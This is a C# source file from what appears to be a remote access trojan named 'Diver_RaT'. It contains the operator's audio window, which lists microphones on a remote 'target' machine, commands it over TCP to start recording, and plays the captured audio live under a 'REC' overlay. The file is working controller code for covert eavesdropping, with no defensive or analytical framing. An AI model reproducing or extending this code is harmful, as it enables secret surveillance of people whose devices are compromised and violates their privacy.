using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Text.Json;
using System.Threading;
using System.Windows;
using System.Windows.Threading;

namespace Diver_RaT
{
    public partial class AudioWindow : Window
    {
        private readonly TcpServer _server;
        private readonly Device _device;
        private readonly DispatcherTimer _pollTimer;
        private readonly ConcurrentQueue<byte[]> _playQueue = new();
        private Thread? _playerThread;
        private volatile bool _listening;
        private bool _fetching;
        private int _consecutiveErrors;

        public AudioWindow(TcpServer server, Device device)
        {
            InitializeComponent();
            _server = server;
            _device = device;
            Title = $"System Audio - {device.ComputerName}";
            TargetText.Text = $"{device.ComputerName} ({device.IpAddress})";

            _pollTimer = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(250) };
            _pollTimer.Tick += (_, _) => _ = FetchChunk();

            _ = LoadMics();
        }

        private async System.Threading.Tasks.Task LoadMics()
        {
            StatusText.Text = "Detecting microphones...";
            var result = await _server.SendCommandAsync(_device.Id, "LIST_MICS", timeoutMs: 15000);
            if (!result.Success)
            {
                StatusText.Text = $"Could not detect microphones: {result.Error}";
                return;
            }

            var items = new List<MicItem>();
            try
            {
                using var doc = JsonDocument.Parse(result.Result ?? "[]");
                foreach (var e in doc.RootElement.EnumerateArray())
                {
                    items.Add(new MicItem
                    {
                        Index = e.TryGetProperty("index", out var i) ? i.GetInt32() : 0,
                        Name = e.TryGetProperty("name", out var n) ? n.GetString() ?? "" : ""
                    });
                }
            }
            catch (Exception ex)
            {
                StatusText.Text = $"Invalid mic list: {ex.Message}";
                return;
            }

            if (items.Count == 0)
            {
                StatusText.Text = "No microphone found on the target.";
                return;
            }

            MicCombo.IsEnabled = true;
            MicCombo.ItemsSource = items;
            MicCombo.SelectedIndex = 0;
            StatusText.Text = $"Detected {items.Count} microphone(s). Press Start Listening.";
        }

        private async void ListenButton_Click(object sender, RoutedEventArgs e)
        {
            if (_listening)
            {
                await StopListening();
                return;
            }

            var args = MicCombo.SelectedItem is MicItem mic
                ? new Dictionary<string, string> { ["index"] = mic.Index.ToString() }
                : null;
            var result = await _server.SendCommandAsync(_device.Id, "START_AUDIO", args, timeoutMs: 10000);
            if (!result.Success)
            {
                StatusText.Text = $"Start failed: {result.Error}";
                return;
            }

            _listening = true;
            _consecutiveErrors = 0;
            _playQueue.Clear();
            MicCombo.IsEnabled = false;
            ListenButton.Content = "\U0001f399  Stop Listening";
            MicVisual.Foreground = System.Windows.Media.Brushes.Lime;
            StatusOverlay.Text = "REC";
            StatusOverlay.Visibility = Visibility.Visible;
            StatusText.Text = $"Listening to {_device.ComputerName}...";

            _playerThread = new Thread(PlaybackLoop) { IsBackground = true };
            _playerThread.Start();
            _pollTimer.Start();
        }

        private async System.Threading.Tasks.Task FetchChunk()
        {
            if (!_listening || _fetching) return;
            _fetching = true;
            try
            {
                var result = await _server.SendCommandAsync(_device.Id, "GET_AUDIO", timeoutMs: 6000);
                if (result.Success && !string.IsNullOrEmpty(result.Result))
                {
                    _playQueue.Enqueue(Convert.FromBase64String(result.Result));
                    _consecutiveErrors = 0;
                    StatusText.Text = $"Listening to {_device.ComputerName}...";
                }
                else if (result.Success)
                {
                    // No data yet (mic warming up) - not an error
                    if (_playQueue.Count == 0)
                        StatusText.Text = "Listening... waiting for microphone feed";
                }
                else
                {
                    _consecutiveErrors++;
                    if (_consecutiveErrors >= 5)
                    {
                        StatusText.Text = $"Mic feed interrupted: {result.Error}";
                        await StopListening();
                    }
                }
            }
            catch (Exception ex)
            {
                _consecutiveErrors++;
                StatusText.Text = $"Audio error: {ex.Message}";
            }
            finally
            {
                _fetching = false;
            }
        }

        private void PlaybackLoop()
        {
            while (_listening)
            {
                if (_playQueue.TryDequeue(out var wav))
                {
                    // Keep latency low: drop stale chunks if we fall behind
                    while (_playQueue.Count > 2 && _playQueue.TryDequeue(out var stale)) { }
                    try
                    {
                        using var ms = new MemoryStream(wav);
                        using var player = new System.Media.SoundPlayer(ms);
                        player.PlaySync();
                    }
                    catch
                    {
                    }
                }
                else
                {
                    Thread.Sleep(10);
                }
            }
        }

        private async System.Threading.Tasks.Task StopListening()
        {
            _listening = false;
            _pollTimer.Stop();
            _playQueue.Clear();
            if (_playerThread is { IsAlive: true }) _playerThread.Join(2000);
            _playerThread = null;

            MicCombo.IsEnabled = true;
            ListenButton.Content = "\U0001f399  Start Listening";
            MicVisual.Foreground = System.Windows.Media.Brushes.DimGray;
            StatusOverlay.Visibility = Visibility.Collapsed;

            try { await _server.SendCommandAsync(_device.Id, "STOP_AUDIO", timeoutMs: 10000); } catch { }
            StatusText.Text = "Listening stopped";
        }

        private async void Window_Closing(object? sender, CancelEventArgs e)
        {
            _pollTimer.Stop();
            _listening = false;
            _playQueue.Clear();
            try { await _server.SendCommandAsync(_device.Id, "STOP_AUDIO", timeoutMs: 5000); } catch { }
        }
    }

    public class MicItem
    {
        public int Index { get; set; }
        public string Name { get; set; } = "";
        public override string ToString() => $"{Index + 1}. {Name}";
    }
}
